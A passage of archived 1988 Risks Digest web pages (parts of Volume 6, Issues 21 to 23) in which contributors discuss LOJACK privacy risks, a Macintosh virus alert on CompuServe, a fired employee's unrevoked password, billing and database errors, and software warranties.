The time signal is ALWAYS there, beening generated by some central clock.
It is problably not coming for a "general purpose" computer, but
rather a piece of special hardware as part of the distribution equipment.

(Disclaimer: I have little knowledge of actual Cable TV electronics)

Ted G. Kekatos
backbone!ihnp4!ihuxv!tedk                     (312) 979-0804
AT&amp;T Bell Laboratories, Indian Hill South, IX-1F-460
Naperville &amp; Wheaton Roads - Naperville, Illinois. 60566 USA

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Signals on power lines
</A>
</H3>
<address>
Peter da Silva
&lt;<A HREF="mailto:nuchat!peter@uunet.UU.NET ">
nuchat!peter@uunet.UU.NET 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 3 Feb 88 12:46:49 GMT
Organization: Public Access - Houston, Tx

I hope they shove the signal even higher than 19 KHz. Some of us can hear
that high.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
The risk of LOJACK
</A>
</H3>
<address>
&lt;<A HREF="mailto:Vail_J@DUR08.CEO.DG.COM">
Vail_J@DUR08.CEO.DG.COM
</A>&gt;
</address>
<i>
Wed, 3 Feb 88 17:48:12 EST
</i><PRE>

This concerns the implications (risks!) of the LOJACK (sp?) anit-car-theft
system.  My information on this subject is based on a sales pitch and
brochure when I bought my new car.

The LOJACK system is designed to quickly retrieve a stolen car and apprehend
the thief before serious damage has occured to the car.  When a person buys
a new car they can, for about $500, have a LOJACK system installed in a
random hidden place (inside frame members, etc) in their car by the dealer.
When the person realizes that their new car is missing they call toll free
the LOJACK office, presumably supplying an authentification code.  The
operator then calls up the relevent info (presumably plate number, make,
model, color, etc.) and broadcast this info on radio transmitters around the
state or area.  The LOJACK unit in the stolen car responds and starts
transmitting a locating beacon.  The police, with special LOJACK finders in
their cruiser also recieve the information on a small display and if they
are within range of the stolen car then directional (and range?)
information is displayed as well.  Thus they can quickly locate the stolen
car.  All fine and dandy.

This system is installed and operating in Massachussetts.  Supposedly
every state police cruiser and at least 1 cruiser in every town is
equipped with the LOJACK equipment (you can tell by the 4 18" whips in
a diamond pattern on the roof of the cruiser).  I don't know how
effective this has been lately but in testing I was told they found
autos in different parts of the state in an average of 7 minutes!

The risks with this system should be obvious to the RISKS reader.
Suppose big brother wants to arrest Joe Citizen (to assist the
ministry of information with certain inquiries or course).  Big
brother simply broadcasts his LOJACK code and the cops bring 'em in.
Or just keeps an eye on him.  I think that the LOJACK people control
the data and in theory it doesn't work that way _today_.

I would be interested in hearing what other people think about this system
and if anyone has any technical information (frequencies, etc) I would be
particulary interested.  One quick note: although I didn't buy this system
(I don't live in the People's Republic of Massachussetts) but a friend did
buy one and it never even occured to him that it could be used this way.  I
think _that_ is one of the greatest risks of this kind of a system
(double-edged blade).

Johnathan Vail (603) 862-6562

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Risks of helpful news software
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 3 Feb 88 05:40:15 EST
</i><PRE>

This one is old news on Usenet, but may not be so well-known elsewhere.
Normal Usenet newsgroups are "unmoderated", i.e. anyone at a Usenet site
may post contributions without having to route them through a moderator
for approval.  Postings propagate via a "flooding" broadcast protocol:
when a site receives a new posting, it sends the new posting to ALL other
sites that exchange news with it.  There are some other provisions that
break loops and prevent duplications.  Normally, this works pretty well;
it is much more efficient than point-to-point mailing lists for traffic
that is read by many people.  (A minor variation on this method is now being
used on parts of the Internet as well.)

Relatively recently, an attempt has been made to provide better support
for moderated newsgroups, which still use the flooding protocol but which
do clear all submissions through a human moderator first.  (Some Arpanet
mailing lists are gatewayed onto Usenet as such groups.)  Modern versions
of the news software will either post a user's followup or mail it to
the moderator, depending on the nature of the newsgroup.  Now, the older
versions did not do this, and Usenet's lack of central authority makes it
impossible to enforce coordinated software upgrades, so there are backwaters
of the net where this doesn't work.  Like the phone company, Usenet has to
be backward compatible nearly forever.  To minimize loss of submissions at
boundaries between new software and old, while enforcing the all-postings-
via-moderator rule, the new software also mails to the moderator (rather
than posting) when an article arriving from another site is in a moderated
newsgroup and is not marked "approved by moderator".

Of course, this means that if such an article somehow gets posted at an
old-software site with several paths to new-software sites, the poor
moderator gets N copies of it.  This can be anything from a nuisance to a
disaster, depending on the value of N and how frequently it happens.  Some
Usenet moderators nearly quit in disgust shortly after the new software
first came out, when new-old boundaries were common.  It's less of a problem
now, but still crops up on occasion:  due to a complex combination of
mistakes on my part, a routine contribution to Risks from me got posted
instead of mailed here (we run new software but in an unusual configuration),
and PGN got six copies of it at last count.  (Sorry about that, Peter.)

When thousands of sites run software that is willing to send network mail
automatically to specific individuals, those individuals can have a very
rough time of it if the software does something unexpected...

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

   [The volume of barfmail continues to be quite painful, particularly
   from addresses that have worked consistently in the past.  I am therefore
   instituting a more Draconian policy of simply not trying to track down
   these problems.  If I don't hear from you when you STOP getting RISKS, I
   can only assume that you don't care.  (But don't panic if a week goes by
   without your RISKS FIX.  There are weeks when I cannot get to it.)  

   A sample of recently barfed addresses includes
   ...@OPTIMIS-pent.arpa, ...@VLSI.JPL.NASA.GOV, ...@graf.poly.edu, 
   ...@ADS.ARPA, ...@JPL-MIL.ARPA, ...@ACATT1.ARPA, and
   &lt;BBOARD&gt;RISKS.TXT@ECLC.USC.EDU (No such mailbox!).  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
"My country's misguided technology transfer policy"
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
3 Feb 88 01:05:11 PST (Wednesday)
</i><PRE>
From: "hugh_davies.WGC1RX"@Xerox.COM

One of my colleagues has a Compaq 386/20 portable. He recently went on a
training course abroad and wanted to take it with him.  He had to spend 2
whole days raising export documentation, including a technology export license
required by the UK Department of Trade under an 'agreement' (did they actually
'agree' to this?) with the US.  Where was he going?,  Oh I forgot to mention. 
Chicago.

Where is the RISK in this? Well, the US technology export legislation is
unpopular enough in Europe as it is (where it is seen mainly as a means by
which US computer manufacturers can have the Eastern European market to
themselves), but when it leads to nonsense like having to obtain a license to
export the technology back to the country it came from, it brings the
legislation into disrepute, and people will just start ignoring it...
                                                                         Hugh

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.20.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.22.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-58</DOCNO>
<DOCOLDNO>IA012-000130-B024-144</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.22.html 128.240.150.127 19970217015511 text/html 21705
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:53:39 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 22</TITLE>
<LINK REL="Prev" HREF="/Risks/6.21.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.23.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.21.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.23.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 22</H1>
<H2> Monday, 8 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Software theft 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Macintosh Virus Hits CompuServe 
</A>
<DD>
<A HREF="#subj2.1">
David HM Spector
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  King Tut, call home! 
</A>
<DD>
<A HREF="#subj3.1">
Bill McGarry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Whistle-blowers 
</A>
<DD>
<A HREF="#subj4.1">
Jon Jacky
</A><br>
<A HREF="#subj4.2">
 Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Even little computers aren't immune from RISKs 
</A>
<DD>
<A HREF="#subj5.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Final results not necessarily correct -- blame the database 
</A>
<DD>
<A HREF="#subj6.1">
Luke Visser
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Early Warning Vulnerability 
</A>
<DD>
<A HREF="#subj7.1">
Ronald J Wanttaja
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Software Warranties 
</A>
<DD>
<A HREF="#subj8.1">
Nancy Leveson
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Software theft
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Mon 8 Feb 88 14:04:14-PST
</i><PRE>

Ming Jyh Hsieh, 38, a computer product support engineer who had been fired
for ``nonperformance'' by the Wollongong Group in Palo Alto CA in November
1987, was caught in the act while downloading Wollongong-proprietary
software to her PC.  She used the ``secret password'' and privileges that
were still valid two months later, and spent 18 hours over several nights
copying software.  Police placed a ``trap and trace'' device on Wollongong's
computer phone lines to identify her phone line.  [Source: Palo Alto Times
Tribune, 7 February 1988]

A few comments are in order.

(1) A password is not secret when it is known to more than one person; in
this case, it was shared among at least 5 people.  (Shared passwords are
generally a bad idea.)

(2) A password is not necessarily secret even if it is kept private by
one person.  Exposures (stored unencrypted, transmitted unencrypted,
derivable, guessable, etc.) are often very easy to obtain.

(3) It is extraordinarily bad practice to fire someone and then not change
all relevant passwords, revoke their privileges, etc.

(4) This kind of problem of nonrevoked privileges seems to happen amazingly
often.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Macintosh Virus Hits CompuServe (long)
</A>
</H3>
<address>
David HM Spector 
&lt;<A HREF="mailto:spector@vx2.GBA.NYU.EDU">
spector@vx2.GBA.NYU.EDU
</A>&gt;
</address>
<i>
Mon, 8 Feb 88 00:31:42 EST
</i><PRE>

Thie following is a notice posted to Compu$erve's HyperCard forum in the
last 24Hrs...  I think this is the first occurance of a live (as opposed to the
sources I mentioned in my last note) virus on the Macintosh (in North America):

I might mention, that based on the sources that were posted to Compu$erve 
(please don't send mail asking for copies, requests will be politely, but 
firmly, rejected), and the description of the virus below, it is possible that 
the posting of the sources directly contributed to this (new?) virus...

Pretty Scary....
           		David

David HM Spector				New York University
Senior Systems Programmer			Graduate School of Business
Arpa: SPECTOR@GBA.NYU.EDU			Academic Computing Center
UUCP:...!{allegra,rocky,harvard}!cmcl2!spector	90 Trinity Place, Rm C-4
MCIMail: DSpector/Compu$erve: 71260,1410	New York, New York 10006
AppleLink: D1161

 =  =  =  =  =  = F r o m  --  C o m p u S e r v e  =  =  =  =  =  =

CompuServe              APPHYPER

One moment please...

Welcome to MAUG(tm):HyperForum, V. 4C(232)

Hello, David HM Spector
Last visit:  06-Feb-88  22:31:04

Forum messages:   1489 to   2516
Last message you've read:   2409

Subtopic(s) Selected:
 All Accessible
No members are in conference.

Short bulletin:

============================
Welcome to HYPERCARD FORUM!!
============================

=========
!!ALERT!!
=========

DO NOT USE THE STACK "NEWAPP.STK" WHICH WAS ONLINE HERE FOR ABOUT 24 HOURS. IT
WILL MESS YOUR SYSTEM WITH UNKNOWN RESULTS. DO NOT USE ANY OTHER SYTEM FROM ANY
OTHER DISK THAT WAS RUN WHILE THE NEWAPP.STK'S MODIFIED SYSTEM WAS ONLINE.

The above stack contains code which modifies your System and other Systems it
comes into contact with. It is a "computer virus." If you run NEWAPP.STK it
will modify the System on the disk it is on so that the System's INITs contain
an INIT labeled "DR." Then, if you use another System with the DR-infected
System as your boot System the new System will also contain the
self-propagating "DR" INIT Resource. While it is possible to, apparently, "cut"
this Resource from infected Systems with the Resource Editor THE ONLY SURE
COURSE OF ACTION IS TO TRASH ANY SYSTEM FILE THAT HAS COME IN CONTACT WITH THIS
STACK.

I apologize for this having happened. Obviously, whoever programmed this
qualifies as being less than pond scum (if it was done purposefully). The
uploader has been locked off the network (not just the Forums) and he will be
contacted by CompuServe and/or myself. Please keep in mind, as always, that
although Sysops do check uploads it is impossible for us to do such things as
examine every file with the Resource Editor. As I have always recommended, keep
downloads away from your hard disk until you are sure they are OK.

In eight years of operation this is the only such occurrence. While I, of
course, cannot say it will be the last I still have just as much confidenc as
always in the fact that 99.99999999% of the Mac Community are quite trustworthy
and that there is no real need to "fear" downloads. Thanks,
-- Neil Shapiro (Chief Sysop)

   *****************************************************************
   |MAUG(tm)(Micronetworked Apple Users Group is a trademark owned |
   | by MCU Inc. (PO Box 520, Bethpage, NY 11714). Voice help line |
   |  available at 516/735-6924 daily _only_ from 10am to 5pm EST  |
   *****************************************************************

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
King Tut, call home!
</A>
</H3>
<address>
Bill McGarry
&lt;<A HREF="mailto:decvax!bunker!wtm@ucbvax.Berkeley.EDU ">
decvax!bunker!wtm@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Fri, 5 Feb 88 23:43:44 EDT
</i><PRE>

Rochester Telephone Corporation (New York) erroneously billed 4,800
customers for phone calls to Egypt.  The company blamed the error
on a computer which "...misread the number dialed and determined
that they were coming from Egypt".

(From the February, 1988 issue of Online.)

Bill McGarry,  Bunker Ramo, Shelton, CT 
                                    {philabs, decvax, fortune, yale}!bunker!wtm

        [Sounds as if they did not know whether they were coming or going! PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Big article on whistle-blowers in new TECHNOLOGY REVIEW
</A>
</H3>
<address>
Jon Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 08 Feb 88 08:56:28 PST

Many RISKS readers who have been following the recent discussion of
whistle-blowing will be interested in "Making the world safe for whistle-
blowers," by Rosemary Chalk, TECHNOLOGY REVIEW 91(1):48 - 57, Jan 1988.
Now on newstands.  Several case histories, a bibliography, and a review
of legal status and protection.

- Jon Jacky, University of Washington

</PRE>
<HR><H3><A NAME="subj4.2">
Re: Whistle-blowing
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Sat, 06 Feb 88 17:32:31 -0800
From: Nancy Leveson &lt;nancy@commerce.UCI.EDU&gt;
Reply-To: nancy@ICS.UCI.EDU

In Risks 6.1 Bob Ayers writes:
 
   &gt;Is it better to have a computerized system -- knowing that it is not 
   &gt;perfect -- or to have a non-computerized system -- which also will not 
   &gt;be perfect, though its faults will be different?
   &gt;Would you use a computer system if, on each use, it had a one in 10^9 
   &gt;chance of killing you?  You use such [non-computer] systems every day.  
   &gt;I recommend the book (also mentioned before) On Acceptable Risk.

The difference is that in non-computerized systems there are techniques to
measure or assess risk so one knows whether the risk is acceptable or not.
These do not exist for software.  So the question is whether it is better
to have a non-computerized system with known, acceptable risk or to have
a computerized system with unknown (and perhaps unacceptable risk).
Would you use a computer OR non-computer system in which you were unsure 
whether the risk was 10^-9 or 10^-3 or 10^-1 chance of killing you?

How many complex, real-time software systems do you know of that have 
demonstrated anything close to a 10^-9 chance of erroneous behavior
(i.e., virtual perfection) over its entire lifetime?  Even if you might
somehow name one or two, does this occur in all software systems so
that one can count on it?

Another difference is that interlocks and other devices are used to protect
against expected failures (non-perfection) in non-computer systems.  How many 
software systems do you know of that contain such protective features?  How
many software engineers know how to build in such protection?  How many
government agencies have guidelines that require safety analysis of computer
systems as they do for non-computer systems?
                                                    Nancy Leveson

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Even little computers aren't immune from RISKs
</A>
</H3>
<address>
Dave Horsfall
&lt;<A HREF="mailto:munnari!stcns3.stc.oz.au!dave@uunet.UU.NET ">
munnari!stcns3.stc.oz.au!dave@uunet.UU.NET 
</A>&gt;
</address>
<i>
Sun, 7 Feb 88 17:52:58 est
</i><PRE>

An extract from "Practical Wireless" February 1988 shows that even
the sort of computer found in homes aren't immune from RISKs.  Most
amateur radio enthusiasts using amateur satellites use a computer to
derive their predictions, and PW has this to say:

  "Those using some satellite computer programs may find that with the
  coming of the new year, their predictions may go astray.  It is possible
  that the new sidereal time values, usually as lines stating "IF Y2 = '87'
  LET G2 = 0.2753606" may not automatically update in some of the older
  programs.  Whilst this can be overcome by calling January 1 1988 "December
  32 1987" and January 2 "December 33" etc, is is better to update your program
  with the new values following: [numbers deleted]"

Yet another "new-year-bug"?  The work-around really tickled my fancy!

Dave Horsfall (VK2KFU)      ACS:  dave@stcns3.stc.OZ.AU
Alcatel-STC Australia       ARPA: dave%stcns3.stc.OZ.AU@uunet.UU.NET
11th Floor, 5 Blue St       UUCP: {enea,hplabs,mcvax,uunet,ukc}!\
North Sydney NSW 2060 AUSTRALIA    munnari!stcns3.stc.OZ.AU!dave

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Final results not necessarily correct -- blame the database
</A>
</H3>
<address>
Luke Visser 
&lt;<A HREF="mailto:munnari!tasis.utas.oz.au!luke@uunet.UU.NET">
munnari!tasis.utas.oz.au!luke@uunet.UU.NET
</A>&gt;
</address>
<i>
Fri, 5 Feb 88 13:06:56 EST
</i><PRE>

On reading Dave Horsfall's contribution from "The Australian" about incorrect
results being sent out to students I remembered a similar situation that
happened here in one of Australia's other states - Tasmania.

One of my friends doesn't like her final results being published in the
state's main newspaper (it's standard practice to print them).  So, she rang 
up the newspaper's office and asked for them not to print her results.
No problems they said except we are having a few problems with our database, 
but we'll see what we can do.

So, sure enough when the results came out in the paper it was evident that
they had some problems with their database.  Her name was printed along with
4 lower passes (not good enough to count towards her Higher School
Certificate).  However, these results were incorrect and she had in fact 
higher passed 3 subjects and passed 2.

It seems to me that they must have really had some big problems with their
database if they couldn't just flag someone's results not to be printed, and
whatever flag they used corrupts the results that are printed.
                                                                   Luke Visser

Snail: Uni of Tasmania, Box 252C GPO, Hobart 7001, Tasmania, Australia.
ACSnet: luke@tasis.utas.oz	ARPA: luke%tasis.utas.oz@uunet.uu.net
UUCP: {enea,hplabs,mcvax,uunet,ukc}!munnari!tasis.utas.oz!luke

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
"Early Warning Vulnerability (Was Re: US Fears Satellites Damaged)
</A>
</H3>
<address>
Ronald J Wanttaja
&lt;<A HREF="mailto:uw-beaver!ssc-vax!wanttaja@rutgers.edu ">
uw-beaver!ssc-vax!wanttaja@rutgers.edu 
</A>&gt;
</address>
<i>
Sun, 7 Feb 88 01:09:25 pst
</i><PRE>

&gt;Consider, too, that such a concerted attack on satellite sensors is precisely
&gt;analogous to, say, saboteurs simultaneously blowing up all the BMEWS missile-
&gt;warning radars:  it is itself an act of war, and an extremely ominous one,
&gt;pointless except as a prelude to a nuclear attack.  It in fact IS a strong
&gt;warning of imminent attack, although not quite an actual launch warning.

True, very true.  But the US does not have a "launch on suspicion" policy.

Consider this scenario:  The Soviets blind most of the US Early Warning
satellites.  Please note, there are NOT of lot of birds tasked for EW; they
wouldn't have to take a lot out.  Assume some small capability remains, as
well as limited functioning among the cripples.

The U.S. immediately goes to high DEFCON.  SAC places the bombers on air
alert, the missile crews batten down the hatches, the President dives into
the airborne command post.

The Soviets do *nothing*.  Maybe issue a public apology.  Maybe raise their
eyebrows and say, "are you sure it wasn't another gas well fire?  Where's
your proof?"  They do not launch their missiles.

Meanwhile, the US is left with limited missile warning capability.  SAC
stays in the air/in the holes, the president lands occasionally, and NORAD
crews work 24 hours a day trying to keep cripples working.

We can't keep it up forever.  Spacecraft are expensive, launch costs are
high.  It doesn't make sense to the bean counters to have replacement birds
on any sort of alert.  We CAN NOT regain capability quickly.  Nor can
we remain at elevated DEFCON levels indefinitely.  

Two months of this type of operation, and the BUFFs (SAC B-52s) are down
for maintenance, the missile crew's morale is at rock bottom, and the
cripples are falling by the wayside.  The President is back in DC, working
on the budget.  *Then* would be a good time for a major attack...

Ron Wanttaja  ex-NORAD Satellite Systems Engineer  (ssc-vax!wanttaja)

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Software Warranties
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Sat, 06 Feb 88 18:53:37 -0800
From: Nancy Leveson &lt;nancy@commerce.UCI.EDU&gt;

Jim Horning once suggested that we need the equivalent of an Underwriter's
Lab for software.  It appears that such a thing now exists, at least for one
professional group.  Three years ago the ABA (American Bar Association)
created the Legal Technology Advisory Council (LTAC) staffed by software
technicians and scores of volunteers (both lawyers and software experts).
The LTAC establishes performance standards for law office software, tests
products against those standards, and gives an official "ABA Mark of
Approval" to products that pass their tests.  To become an ABA-Approved
product, it must have the features that will meet the needs of the law
office, it must do what the vendor claims it will, and it must not have
serious errors in manuals, training, or the software itself.

More than 1500 products have been tested and they have found errors in 
EVERY ONE.  About 50 products in time-and-billing, word processing,
docket and diary, real estate, litigation support, and other areas have
eventually been able to get the stamp of approval after making required
corrections.   Errors that they found include systems that:
    -- would not print a bill
    -- did not identify which key to press to retrieve a document
    -- added dollars to hours (instead of multiplying hours times a
       billing rate to yield dollars)
    -- in a docketing system, automatically erased entries, including
       future court dates, once its capacity was reached
    -- would not show an item as billed, making it likely that the item
       would be inadvertently billed twice
    -- had non-functional security systems
    -- multiplied rate by hours incorrectly
    -- printed the wrong billing name and address on a bill
    -- tallied different totals across and down headings
    -- had instruction manuals that provided incomplete or incorrect
       information and omitted crucial steps.

The LTAC publishes detailed information for each approved product on
product features and results from the testing process.  There are also
guidelines for various types of software that specify features that must 
be offered for ABA approval and preferred features (not required but very 
desirable).  Besides performance features, the guidelines also require that 
systems be free of bugs, that advertising claims conform exactly to system
capabilities, and that printed or on-line training and help instructions
be clear and easy to understand.  That is, they claim that ABA approval
will assure that a product is free of bugs and will perform as advertised.

The most fascinating part to me is that they recommend that if lawyers must
consider a product that is not approved, they should ask the vendor to
WARRANT that their product meets the ABA standards: that it has ALL the
features you need AND that it is free of errors and bugs.  The booklet
I read says to "either prepare a formal, written warranty for the vendor
to sign or prepare a formal RFP that lists the LTAC guidelines for the
specifications."  Considering the standard disclaimers that usually come with
commercial software, I wonder how successful lawyers have been at getting
vendors to sign such warranties.

This seems like an interesting model for other professional groups to follow.

Nancy Leveson

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.21.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.23.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-59</DOCNO>
<DOCOLDNO>IA012-000130-B024-163</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.23.html 128.240.150.127 19970217015525 text/html 23995
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:53:51 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 23</TITLE>
<LINK REL="Prev" HREF="/Risks/6.22.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.24.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.22.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.24.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 23</H1>
<H2> Tuesday, 9 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Don't believe everything you read in the papers.  
</A>
<DD>
<A HREF="#subj1.1">
David Purdue
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Anti-virus software 
</A>
<DD>
<A HREF="#subj2.1">
Chuck Weinstock
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Virus paranoia 
</A>
<DD>
<A HREF="#subj3.1">
Jeffrey Mogul
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  All Viruses Considered 
</A>
<DD>
<A HREF="#subj4.1">
Martin Minow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  OTA Report: The Electronic Supervisor 
</A>
<DD>
<A HREF="#subj5.1">
Jan Wolitzky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
